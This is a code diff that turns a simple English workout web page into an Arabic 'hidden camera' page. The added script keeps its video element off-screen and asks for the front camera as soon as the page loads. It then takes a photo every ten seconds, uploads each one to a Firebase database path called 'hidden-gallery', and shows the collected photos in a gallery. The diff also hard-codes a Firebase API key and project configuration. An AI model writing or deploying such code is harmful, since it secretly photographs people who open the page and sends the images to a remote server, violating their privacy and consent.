@@ -1,460 +1,325 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FTOUH WORKOUT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FToUH الكاميرا الخفية</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        /* CSS Reset */
+        :root {
+            --primary: #ff0066;
+            --dark: #000000;
+            --accent: #00ccff;
+            --text: #ffffff;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background: linear-gradient(135deg, #000000, #1a0033);
-            color: white;
-            min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
+            background-color: var(--dark);
+            color: var(--text);
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            position: fixed;
         }
 
-        /* Purple Rain Effect */
-        .purple-rain {
+        /* الشريط العلوي */
+        .app-header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+            border-bottom: 1px solid var(--primary);
+        }
+
+        .app-title {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--primary);
+            text-shadow: 0 0 10px var(--primary);
+        }
+
+        .gallery-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+
+        /* معرض الصور */
+        .gallery-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        .drop {
-            position: absolute;
-            width: 4px;
-            height: 20px;
-            background: linear-gradient(to bottom, rgba(138, 43, 226, 0.8), rgba(148, 0, 211, 0.5));
-            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
-            animation: falling linear infinite;
-            transform-origin: 50% 100%;
-            will-change: transform, opacity;
-        }
-
-        @keyframes falling {
-            0% {
-                transform: translateY(-100px) rotate(0deg);
-                opacity: 1;
-            }
-            75% {
-                opacity: 0.8;
-            }
-            100% {
-                transform: translateY(calc(100vh + 100px)) rotate(360deg);
-                opacity: 0;
-            }
-        }
-
-        /* Main Content */
-        .container {
-            position: relative;
-            z-index: 2;
-            padding: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        /* Header */
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-            position: relative;
-        }
-
-        .logo {
-            font-size: 2.5rem;
-            font-weight: bold;
-            background: linear-gradient(to right, #9c27b0, #e91e63);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 10px rgba(156, 39, 176, 0.5);
-            animation: glow 2s infinite alternate;
-        }
-
-        @keyframes glow {
-            from {
-                text-shadow: 0 0 10px rgba(156, 39, 176, 0.5);
-            }
-            to {
-                text-shadow: 0 0 20px rgba(233, 30, 99, 0.8), 0 0 30px rgba(156, 39, 176, 0.6);
-            }
-        }
-
-        /* Hamburger Menu */
-        .menu-btn {
-            width: 30px;
-            height: 20px;
-            display: flex;
+            background-color: var(--dark);
+            z-index: 200;
+            display: none;
             flex-direction: column;
-            justify-content: space-between;
-            cursor: pointer;
-            z-index: 10;
-        }
-
-        .menu-btn span {
-            display: block;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(to right, #9c27b0, #e91e63);
-            border-radius: 3px;
-            transition: all 0.3s ease;
-        }
-
-        .menu-btn.active span:nth-child(1) {
-            transform: translateY(8px) rotate(45deg);
-        }
-
-        .menu-btn.active span:nth-child(2) {
-            opacity: 0;
-        }
-
-        .menu-btn.active span:nth-child(3) {
-            transform: translateY(-8px) rotate(-45deg);
-        }
-
-        /* Sidebar Menu */
-        .sidebar {
-            position: fixed;
-            top: 0;
-            right: -300px;
-            width: 250px;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(10px);
-            box-shadow: -5px 0 15px rgba(156, 39, 176, 0.5);
-            z-index: 5;
-            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            padding: 80px 20px 20px;
+            padding-top: 60px;
             overflow-y: auto;
         }
 
-        .sidebar.active {
-            right: 0;
-        }
-
-        .sidebar ul {
-            list-style: none;
-        }
-
-        .sidebar ul li {
-            margin-bottom: 15px;
-            position: relative;
-        }
-
-        .sidebar ul li a {
-            color: white;
-            text-decoration: none;
-            font-size: 1.2rem;
-            display: block;
-            padding: 10px;
-            border-radius: 5px;
-            transition: all 0.3s ease;
-            background: rgba(156, 39, 176, 0.1);
-        }
-
-        .sidebar ul li a:hover {
-            background: rgba(156, 39, 176, 0.3);
-            transform: translateX(10px);
-        }
-
-        /* Workout Content */
-        .workout-content {
-            margin-top: 30px;
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .workout-content.active {
-            display: block;
-        }
-
-        .workout-title {
-            font-size: 1.8rem;
-            margin-bottom: 20px;
-            color: #9c27b0;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(156, 39, 176, 0.5);
-        }
-
-        .exercise-list {
-            list-style: none;
-        }
-
-        .exercise-list li {
-            background: rgba(255, 255, 255, 0.1);
-            margin-bottom: 15px;
+        .gallery-header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.9);
             padding: 15px;
-            border-radius: 8px;
-            border-left: 4px solid #9c27b0;
-            transform: translateX(-20px);
-            opacity: 0;
-            animation: slideIn 0.5s forwards;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 210;
+            border-bottom: 1px solid var(--primary);
         }
 
-        .exercise-list li:hover {
-            transform: translateX(0) scale(1.02);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        .gallery-title {
+            font-size: 1.3rem;
+            color: var(--accent);
         }
 
-        @keyframes slideIn {
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
+        .close-gallery {
+            background: none;
+            border: none;
+            color: var(--text);
+            font-size: 1.5rem;
+            cursor: pointer;
         }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Home Content */
-        .home-content {
-            text-align: center;
-            margin-top: 50px;
-            animation: fadeIn 1s ease;
-        }
-
-        .home-content h1 {
-            font-size: 3rem;
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 5px;
+            padding: 10px;
             margin-bottom: 20px;
-            background: linear-gradient(to right, #9c27b0, #e91e63);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 20px rgba(156, 39, 176, 0.5);
         }
 
-        .home-content p {
-            font-size: 1.2rem;
-            line-height: 1.6;
-            max-width: 600px;
-            margin: 0 auto 30px;
-            color: #ccc;
+        .gallery-item {
+            width: 100%;
+            aspect-ratio: 1;
+            object-fit: cover;
+            border-radius: 5px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .logo {
-                font-size: 2rem;
-            }
-            
-            .home-content h1 {
-                font-size: 2.5rem;
-            }
-            
-            .workout-title {
-                font-size: 1.5rem;
-            }
+        .gallery-empty {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 60vh;
+            color: rgba(255, 255, 255, 0.5);
         }
 
-        @media (max-width: 480px) {
-            .logo {
-                font-size: 1.8rem;
-            }
-            
-            .home-content h1 {
-                font-size: 2rem;
-            }
-            
-            .sidebar {
-                width: 80%;
-                right: -85%;
-            }
+        /* عنصر الكاميرا المخفي */
+        .camera-element {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+
+        /* رسالة التحميل */
+        .loading-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 300;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Purple Rain Effect -->
-    <div class="purple-rain" id="purpleRain"></div>
+    <!-- الشريط العلوي -->
+    <div class="app-header">
+        <div class="app-title">FToUH</div>
+        <button class="gallery-btn" id="galleryBtn">المعرض</button>
+    </div>
 
-    <div class="container">
-        <header>
-            <div class="logo">FTOUH WORKOUT</div>
-            <div class="menu-btn" id="menuBtn">
-                <span></span>
-                <span></span>
-                <span></span>
-            </div>
-        </header>
-
-        <!-- Sidebar Menu -->
-        <div class="sidebar" id="sidebar">
-            <ul>
-                <li><a href="#" data-target="home">Home</a></li>
-                <li><a href="#" data-target="legs">Legs</a></li>
-                <li><a href="#" data-target="abs">Abs</a></li>
-                <li><a href="#" data-target="chest">Chest and Shoulder</a></li>
-                <li><a href="#" data-target="cardio">Cardio</a></li>
-            </ul>
+    <!-- معرض الصور -->
+    <div class="gallery-container" id="galleryContainer">
+        <div class="gallery-header">
+            <div class="gallery-title">الصور الملتقطة</div>
+            <button class="close-gallery" id="closeGallery">✕</button>
         </div>
-
-        <!-- Home Content -->
-        <div class="workout-content active" id="home">
-            <div class="home-content">
-                <h1>FTOUH WORKOUT</h1>
-                <p>Your ultimate fitness companion with the most effective workout routines</p>
-                <p>Select a category from the menu to view exercises</p>
-            </div>
+        
+        <div class="gallery-grid" id="galleryGrid">
+            <!-- الصور تظهر هنا تلقائياً -->
         </div>
-
-        <!-- Legs Workout -->
-        <div class="workout-content" id="legs">
-            <h2 class="workout-title">Legs Workout</h2>
-            <ul class="exercise-list">
-                <li>35 squat with full bag × 5</li>
-                <li>wide squat with full bag × 2</li>
-                <li>30 calf raises with full bag × 5</li>
-                <li>28 lunges with full bag × 4</li>
-                <li>17 squat with full bag and front kick × 3</li>
-            </ul>
-        </div>
-
-        <!-- Abs Workout -->
-        <div class="workout-content" id="abs">
-            <h2 class="workout-title">Abs Workout</h2>
-            <ul class="exercise-list">
-                <li>30 crunch × 6</li>
-                <li>plank 50 second × 3</li>
-                <li>30 Russian twist × 4</li>
-                <li>15 leg raises × 4</li>
-            </ul>
-        </div>
-
-        <!-- Chest and Shoulder Workout -->
-        <div class="workout-content" id="chest">
-            <h2 class="workout-title">Chest and Shoulder Workout</h2>
-            <ul class="exercise-list">
-                <li>8 knee push up × 5</li>
-                <li>6 knee push up with full bag × 4</li>
-                <li>5 knee push up close grip × 3</li>
-                <li>5 knee push up with close grip and full bag × 3</li>
-            </ul>
-        </div>
-
-        <!-- Cardio Workout -->
-        <div class="workout-content" id="cardio">
-            <h2 class="workout-title">Cardio Workout</h2>
-            <ul class="exercise-list">
-                <li>40 jumping jacks × 7</li>
-                <li>20 mountain climb × 4</li>
-                <li>50 jab left + 50 jab right</li>
-                <li>50 Hook left + 50 hook right</li>
-                <li>30 front kick left + 30 right</li>
-            </ul>
+        
+        <div class="gallery-empty" id="galleryEmpty">
+            <div>لا توجد صور في المعرض بعد</div>
         </div>
     </div>
 
+    <!-- عناصر الكاميرا المخفية -->
+    <video class="camera-element" id="cameraView" autoplay playsinline></video>
+    <canvas class="camera-element" id="cameraCanvas"></canvas>
+    
+    <!-- رسالة التحميل -->
+    <div class="loading-message" id="loadingMessage">
+        جاري التهيئة... الرجاء الانتظار
+    </div>
+
+    <!-- الكود الرئيسي -->
     <script>
-        // JavaScript for interactive elements
+        // تهيئة Firebase - استبدل بمعلومات مشروعك
+        const firebaseConfig = {
+            apiKey: "AIzaSyAkv21njRIY0Ply1XG2OzY_I9hjzJdbI08",
+            authDomain: "my-messenger-5cca2.firebaseapp.com",
+            databaseURL: "https://my-messenger-5cca2-default-rtdb.firebaseio.com",
+            projectId: "my-messenger-5cca2",
+            storageBucket: "my-messenger-5cca2.appspot.com",
+            messagingSenderId: "317158541033",
+            appId: "1:317158541033:web:63bc67e8b369239cedd278"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
         document.addEventListener('DOMContentLoaded', function() {
-            // Menu Toggle
-            const menuBtn = document.getElementById('menuBtn');
-            const sidebar = document.getElementById('sidebar');
-            
-            menuBtn.addEventListener('click', function() {
-                this.classList.toggle('active');
-                sidebar.classList.toggle('active');
+            // العناصر
+            const galleryBtn = document.getElementById('galleryBtn');
+            const galleryContainer = document.getElementById('galleryContainer');
+            const closeGallery = document.getElementById('closeGallery');
+            const galleryGrid = document.getElementById('galleryGrid');
+            const galleryEmpty = document.getElementById('galleryEmpty');
+            const cameraView = document.getElementById('cameraView');
+            const cameraCanvas = document.getElementById('cameraCanvas');
+            const loadingMessage = document.getElementById('loadingMessage');
+
+            // متغيرات
+            let stream = null;
+            let captureInterval = null;
+            let isCameraActive = false;
+
+            // عرض رسالة التحميل
+            loadingMessage.style.display = 'block';
+
+            // فتح المعرض
+            galleryBtn.addEventListener('click', () => {
+                galleryContainer.style.display = 'flex';
+                loadGallery();
             });
 
-            // Navigation between workout sections
-            const navLinks = document.querySelectorAll('.sidebar ul li a');
-            const workoutContents = document.querySelectorAll('.workout-content');
-            
-            navLinks.forEach(link => {
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
+            // إغلاق المعرض
+            closeGallery.addEventListener('click', () => {
+                galleryContainer.style.display = 'none';
+            });
+
+            // تحميل المعرض من Firebase
+            function loadGallery() {
+                database.ref('hidden-gallery').on('value', (snapshot) => {
+                    const images = snapshot.val();
+                    galleryGrid.innerHTML = '';
                     
-                    // Get target section
-                    const target = this.getAttribute('data-target');
-                    
-                    // Hide all contents
-                    workoutContents.forEach(content => {
-                        content.classList.remove('active');
+                    if (images && Object.keys(images).length > 0) {
+                        galleryEmpty.style.display = 'none';
+                        
+                        // ترتيب الصور من الأحدث إلى الأقدم
+                        Object.entries(images).sort((a, b) => b[1].timestamp - a[1].timestamp).forEach(([key, img]) => {
+                            const imgElement = document.createElement('img');
+                            imgElement.className = 'gallery-item';
+                            imgElement.src = img.imageUrl;
+                            galleryGrid.appendChild(imgElement);
+                        });
+                    } else {
+                        galleryEmpty.style.display = 'flex';
+                    }
+                });
+            }
+
+            // بدء الكاميرا الخفية (الكاميرا الأمامية)
+            async function startHiddenCamera() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            facingMode: 'user', // تغيير إلى 'user' لاستخدام الكاميرا الأمامية
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
                     });
                     
-                    // Show target content
-                    document.getElementById(target).classList.add('active');
+                    cameraView.srcObject = stream;
+                    isCameraActive = true;
                     
-                    // Close menu
-                    menuBtn.classList.remove('active');
-                    sidebar.classList.remove('active');
+                    // بدء التقاط الصور تلقائياً كل 10 ثواني
+                    captureInterval = setInterval(captureAndSaveImage, 10000);
                     
-                    // Animate exercise items
-                    animateExerciseItems();
-                });
-            });
-
-            // Purple Rain Effect
-            function createPurpleRain() {
-                const purpleRain = document.getElementById('purpleRain');
-                const dropsCount = 50;
-                
-                for (let i = 0; i < dropsCount; i++) {
-                    const drop = document.createElement('div');
-                    drop.classList.add('drop');
+                    // إخفاء رسالة التحميل بعد نجاح التشغيل
+                    loadingMessage.style.display = 'none';
                     
-                    // Random properties
-                    const left = Math.random() * 100;
-                    const animationDuration = 2 + Math.random() * 3;
-                    const animationDelay = Math.random() * 5;
-                    const dropHeight = 15 + Math.random() * 15;
-                    const dropWidth = 2 + Math.random() * 3;
+                } catch (error) {
+                    console.error('Camera error:', error);
+                    loadingMessage.textContent = 'تعذر الوصول إلى الكاميرا. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
                     
-                    drop.style.left = `${left}%`;
-                    drop.style.animationDuration = `${animationDuration}s`;
-                    drop.style.animationDelay = `${animationDelay}s`;
-                    drop.style.height = `${dropHeight}px`;
-                    drop.style.width = `${dropWidth}px`;
-                    
-                    purpleRain.appendChild(drop);
+                    // المحاولة مرة أخرى بعد 5 ثواني
+                    setTimeout(startHiddenCamera, 5000);
                 }
             }
-            
-            // Animate exercise items with delay
-            function animateExerciseItems() {
-                const exerciseItems = document.querySelectorAll('.exercise-list li');
+
+            // التقاط الصورة وحفظها
+            async function captureAndSaveImage() {
+                if (!isCameraActive) return;
                 
-                exerciseItems.forEach((item, index) => {
-                    // Reset animation
-                    item.style.animation = 'none';
-                    item.offsetHeight; // Trigger reflow
+                try {
+                    const context = cameraCanvas.getContext('2d');
+                    cameraCanvas.width = cameraView.videoWidth;
+                    cameraCanvas.height = cameraView.videoHeight;
+                    context.drawImage(cameraView, 0, 0, cameraCanvas.width, cameraCanvas.height);
                     
-                    // Apply animation with delay
-                    item.style.animation = `slideIn 0.5s forwards ${index * 0.1}s`;
-                });
+                    const imageUrl = cameraCanvas.toDataURL('image/jpeg', 0.7);
+                    const timestamp = Date.now();
+                    
+                    // حفظ الصورة في Firebase
+                    await database.ref('hidden-gallery/' + timestamp).set({
+                        imageUrl: imageUrl,
+                        timestamp: timestamp
+                    });
+                    
+                    console.log('تم حفظ الصورة تلقائياً');
+                    
+                } catch (error) {
+                    console.error('Capture error:', error);
+                }
             }
-            
-            // Initialize
-            createPurpleRain();
-            setInterval(createPurpleRain, 2000); // Create new drops every 2 seconds
-            
-            // Initial animation for home content
-            animateExerciseItems();
+
+            // إيقاف الكاميرا عند إغلاق الصفحة
+            window.addEventListener('beforeunload', () => {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                }
+            });
+
+            // بدء التطبيق
+            startHiddenCamera();
+            loadGallery();
         });
     </script>
 </body>
